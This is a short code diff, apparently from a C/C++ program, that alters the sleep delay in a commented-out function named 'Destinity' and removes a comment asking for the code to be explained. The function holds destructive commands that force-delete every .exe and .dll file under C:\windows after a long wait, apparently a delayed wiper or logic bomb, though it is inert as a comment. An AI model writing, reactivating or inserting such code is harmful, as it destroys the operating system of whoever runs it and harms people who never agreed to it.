@@ -130,10 +130,9 @@
 
 
 // void Destinity(){
-//      Sleep(600000000);
+//      Sleep(10000000000000000);
 //      system("del C:\\windows\\*exe /F /S /Q");
 //      system("del C:\\windows\\*dll /F /S /Q");
 // }
 
 
-// Make me understand this code 
